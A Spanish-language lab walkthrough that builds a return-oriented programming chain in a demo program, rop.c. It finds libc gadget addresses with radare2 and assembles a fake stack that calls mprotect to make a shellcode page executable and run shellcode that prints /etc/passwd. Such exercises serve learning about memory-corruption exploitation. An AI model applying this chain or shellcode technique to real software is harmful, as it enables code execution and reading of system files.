Una vez copiado nuestro shellcode en rop.c necesitamos buscar la dirección base de la libc:
r2 -d rop
aaa
db main
dc
dm | grep libc

Esto nos da la dirección del marco de página de la libc (0x00007ffff7e00000).

Los valores de los parámetros que necesitamos para realizar la llamada al sistema mprotect son los siguientes:
	- %rax = 10 (en hexadecimal = 0xa)

	- %rdi = inicio de la página
	  La buscamos de la siguiente forma:
	  r2 -d rop
	  aaa
	  is | grep shellcode

	  Nos devuelve que la dirección del shellcode es 0x555555558040, pero como hay que pasarle el marco de página de esa dirección, debemos pasar una dirección alineada a 4096 -> 0x555555558000

	- %rsi = longitud de la página, que es 4096 (0x1000 en hexadecimal). Se puede mirar ejecutando "getconf PAGE_SIZE"

	- %rdx = los permisos que queremos otorgarle, en nuestro caso ejecución. Por tanto sería 0x4

Ahora mediante gadgets debemos hacer pop de los registros %rax, %rdi, %rsi, %rdx. Para ello utilizaremos los siguientes gadgets:
- %rax -
0x0003ee88                 58  popq %rax
0x0003ee89                 c3  retq

- %rdi -
0x00026796                 5f  popq %rdi
0x00026797                 c3  retq

- %rsi -
0x0002890f                 5e  popq %rsi
0x00028910                 c3  retq

- %rdx -
0x000cb1cd                 5a  popq %rdx
0x000cb1ce                 c3  retq

Debemos calcular (la dirección base de la libc + las direcciones de estos gadgets) para luego utilizarlas en nuestro código rop.c:
popq %rax -> 0x00007ffff7e00000 + 0x0003ee88 = 0x7ffff7e3ee88
popq %rdi -> 0x00007ffff7e00000 + 0x00026796 = 0x7ffff7e26796
popq %rsi -> 0x00007ffff7e00000 + 0x0002890f = 0x7ffff7e2890f
popq %rdx -> 0x00007ffff7e00000 + 0x000cb1cd = 0x7ffff7ecb1cd

La última instrucción que necesitaremos será syscall. Utilizaremos el siguiente gadget:
0x00084135               0f05  syscall
0x00084137                 c3  retq

syscall -> 0x00007ffff7e00000 + 0x00084135 = 0x7ffff7e84135


Por último, debemos introducir las direcciones de los gadgets y los valores de los parámetros en nuestro código rop.c:	  
char newstack[Sz] = {
    0x88, 0xee, 0xe3, 0xf7, 0xff, 0x7f, 0x00, 0x00, // %rax -> 0x7ffff7e3ee88
    0x0a, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // %rax = 0xa
    0x96, 0x67, 0xe2, 0xf7, 0xff, 0x7f, 0x00, 0x00, // %rdi -> 0x7ffff7e26796
    0x00, 0x80, 0x55, 0x55, 0x55, 0x55, 0x00, 0x00, // %rdi = 0x555555558000    
    0x0f, 0x89, 0xe2, 0xf7, 0xff, 0x7f, 0x00, 0x00, // %rsi -> 0x7ffff7e2890f
    0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // %rsi = 0x1000
    0xcd, 0xb1, 0xec, 0xf7, 0xff, 0x7f, 0x00, 0x00, // %rdx -> 0x7ffff7ecb1cd
    0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // %rdx = 0x4
    0x35, 0x41, 0xe8, 0xf7, 0xff, 0x7f, 0x00, 0x00, // syscall -> 0x7ffff7e84135
    0x40, 0x80, 0x55, 0x55, 0x55, 0x55, 0x00, 0x00 // dir. shellcode = 0x555555558040
};


Para ejecutar el código sólo tendríamos que hacer:
gcc rop.c -o rop
./rop

Y debería salirnos el contenido de /etc/passwd.
